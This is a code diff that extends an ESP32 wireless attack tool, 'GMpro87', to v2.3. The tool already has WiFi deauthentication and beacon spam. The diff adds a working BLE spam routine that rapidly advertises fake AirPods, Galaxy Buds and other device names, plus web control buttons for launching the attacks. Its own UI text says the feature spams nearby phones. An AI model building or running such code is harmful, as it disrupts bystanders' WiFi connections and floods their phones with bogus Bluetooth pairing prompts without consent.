@@ -2,6 +2,9 @@
 #include "esp_wifi.h"
 #include <WebServer.h>
 #include <vector>
+#include <BLEDevice.h>
+#include <BLEUtils.h>
+#include <BLEAdvertising.h>
 
 // Safe pins for ESP32 DevKit
 const int btnDeauth = 35;
@@ -19,12 +22,72 @@ struct wifiData {
 wifiData targetData;
 bool isAttacking = false;
 bool isBeaconSpam = false;
+bool isBLESpam = false;
 bool isScanDone = false;
 unsigned long attackStartTime = 0;
 unsigned long beaconCount = 0;
+unsigned long bleCount = 0;
 uint8_t broadcastAddr[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
 
 WebServer server(80);
+BLEAdvertising* pAdvertising;
+TaskHandle_t bleTaskHandle = NULL;
+
+// BLE Devices to spam (Apple AirPods and others)
+const char* bleNames[] = {
+  "AirPods", "AirPods Pro", "AirPods Max", "AirPods Gen2", "AirPods Gen3",
+  "AirPods Pro2", "PowerBeats", "PowerBeats Pro", "Beats Solo", "Beats Studio",
+  "Beats Flex", "Beats X", "Beats Studio Pro", "Galaxy Buds", "Galaxy Buds+",
+  "Galaxy Buds2", "Galaxy Buds Pro", "Galaxy Buds Live", "Pixel Buds",
+  "Jabra Elite", "Sony WH-1000XM4", "Bose QC45", "Surface Earbuds",
+  "LG Tone", "JBL Live", "Samsung Watch", "Apple Watch", "Fitbit"
+};
+
+int bleNameCount = sizeof(bleNames) / sizeof(bleNames[0]);
+
+// === BLESpam Task ===
+void bleSpamLoop(void* param) {
+  while (isBLESpam) {
+    BLEDevice::init("");
+    BLEAdvertising* pAdvertising = BLEDevice::getAdvertising();
+    
+    int idx = random(bleNameCount);
+    String name = bleNames[idx];
+    
+    BLEAdvertisementData advData;
+    advData.setName(name.c_str());
+    advData.setFlags(0x06); // LE General Discoverable + BR/EDR Not
+    
+    pAdvertising->setAdvertisementData(advData);
+    pAdvertising->start();
+    
+    bleCount++;
+    delay(50);
+    pAdvertising->stop();
+    delay(50);
+    
+    yield();
+  }
+  vTaskDelete(NULL);
+}
+
+void startBLESpam() {
+  if (isBLESpam) return;
+  isBLESpam = true;
+  BLEDevice::init("");
+  xTaskCreate(bleSpamLoop, "ble_spam", 4096, NULL, 1, &bleTaskHandle);
+  Serial.println("[*] BLE Spam Started");
+}
+
+void stopBLESpam() {
+  isBLESpam = false;
+  if (bleTaskHandle) {
+    vTaskDelete(bleTaskHandle);
+    bleTaskHandle = NULL;
+  }
+  BLEDevice::deinit(false);
+  Serial.println("[*] BLE Spam Stopped");
+}
 
 // === PACKET INJECTION ===
 void sendPacket(const uint8_t* bssid, const uint8_t* sta) {
@@ -74,26 +137,42 @@ String getHTML() {
   html += "h1{color:#0f0;text-align:center;text-shadow:0 0 20px #0f0}";
   html += ".card{background:#1a1a1a;padding:20px;border-radius:12px;margin:15px 0}";
   html += ".btn{display:inline-block;padding:15px 25px;background:#0f0;color:#000;border:none;border-radius:8px;font-size:16px;margin:5px;cursor:pointer;font-weight:bold}";
+  html += ".btnb{background:#00f;color:#fff}";
   html += ".btnr{background:#f00;color:#fff}";
   html += ".info{display:flex;justify-content:space-between;padding:10px;border-bottom:1px solid #333}";
   html += ".label{color:#888}";
   html += ".val{color:#0f0;font-weight:bold}";
   html += "a{text-decoration:none}";
+  html += ".section{margin:20px 0}";
+  html += ".sectitle{color:#0ff;font-size:12px;text-transform:uppercase;margin-bottom:10px}";
   html += "</style></head><body>";
-  html += "<h1>GMpro87 v2.2</h1>";
+  html += "<h1>GMpro87 v2.3</h1>";
   
   html += "<div class='card'>";
-  html += "<div class='info'><span class='label'>Status</span><span class='val'>" + String(isAttacking ? "ATTACKING" : "IDLE") + "</span></div>";
+  html += "<div class='info'><span class='label'>WiFi Attack</span><span class='val'>" + String(isAttacking ? "ACTIVE" : "OFF") + "</span></div>";
+  html += "<div class='info'><span class='label'>Beacon Spam</span><span class='val'>" + String(isBeaconSpam ? "ACTIVE (" + String(beaconCount) + ")" : "OFF") + "</span></div>";
+  html += "<div class='info'><span class='label'>BLE Spam</span><span class='val'>" + String(isBLESpam ? "ACTIVE (" + String(bleCount) + ")" : "OFF") + "</span></div>";
   html += "<div class='info'><span class='label'>Networks</span><span class='val'>" + String(targetData.num) + "</span></div>";
-  html += "<div class='info'><span class='label'>Beacon</span><span class='val'>" + String(isBeaconSpam ? "ON" : "OFF") + "</span></div>";
-  html += "<div class='info'><span class='label'>Version</span><span class='val'>v2.2</span></div>";
+  html += "<div class='info'><span class='label'>Version</span><span class='val'>v2.3</span></div>";
   html += "</div>";
   
+  // WiFi Controls
+  html += "<div class='section'>";
+  html += "<div class='sectitle'>WiFi Controls</div>";
   html += "<div style='text-align:center'>";
   html += "<a href='/'><button class='btn'>Refresh</button></a>";
-  html += "<a href='/scan'><button class='btn'>Scan WiFi</button></a>";
-  html += "<a href='/attack'><button class='btn" + String(isAttacking ? "r" : "") + "'>" + String(isAttacking ? "Stop" : "Attack") + "</button></a>";
-  html += "<a href='/beacon'><button class='btn" + String(isBeaconSpam ? "r" : "") + "'>Beacon " + String(isBeaconSpam ? "OFF" : "SPAM") + "</button></a>";
+  html += "<a href='/scan'><button class='btn btnb'>Scan WiFi</button></a>";
+  html += "<a href='/attack'><button class='btn" + String(isAttacking ? "r" : "") + "'>" + String(isAttacking ? "Stop" : "Deauth") + "</button></a>";
+  html += "<a href='/beacon'><button class='btn" + String(isBeaconSpam ? "r" : "btnb") + "'>Beacon " + String(isBeaconSpam ? "OFF" : "SPAM") + "</button></a>";
+  html += "</div></div>";
+  
+  // BLE Controls
+  html += "<div class='section'>";
+  html += "<div class='sectitle'>BLE Spam</div>";
+  html += "<div style='text-align:center'>";
+  html += "<a href='/ble'><button class='btn" + String(isBLESpam ? "r" : "btnb") + "'>BLE " + String(isBLESpam ? "STOP" : "SPAM") + "</button></a>";
+  html += "</div>";
+  html += "<p style='color:#555;font-size:12px;text-align:center'>Spams nearby phones with fake AirPods and Bluetooth devices</p>";
   html += "</div>";
   
   if (targetData.num > 0) {
@@ -137,11 +216,21 @@ void handleBeacon() {
   server.send(302);
 }
 
+void handleBLE() {
+  if (isBLESpam) {
+    stopBLESpam();
+  } else {
+    startBLESpam();
+  }
+  server.sendHeader("Location", "/");
+  server.send(302);
+}
+
 // === SETUP ===
 void setup() {
   Serial.begin(115200);
   delay(1000);
-  Serial.println("\n[*] GMpro87 v2.2 Starting...");
+  Serial.println("\n[*] GMpro87 v2.3 Starting...");
 
   pinMode(btnDeauth, INPUT_PULLUP);
   pinMode(btnScan, INPUT_PULLUP);
@@ -156,15 +245,17 @@ void setup() {
   
   IPAddress ip = WiFi.softAPIP();
   Serial.print("[+] IP: "); Serial.println(ip);
+  Serial.println("[+] BLE initialized in setup");
 
   Serial.println("[*] Starting web server...");
   server.on("/", handleRoot);
   server.on("/scan", handleScan);
   server.on("/attack", handleAttack);
   server.on("/beacon", handleBeacon);
+  server.on("/ble", handleBLE);
   server.begin();
 
-  Serial.println("[+] GMpro87 v2.2 Ready!");
+  Serial.println("[+] GMpro87 v2.3 Ready!");
   Serial.println("[*] Web: http://192.168.4.1");
 }
 
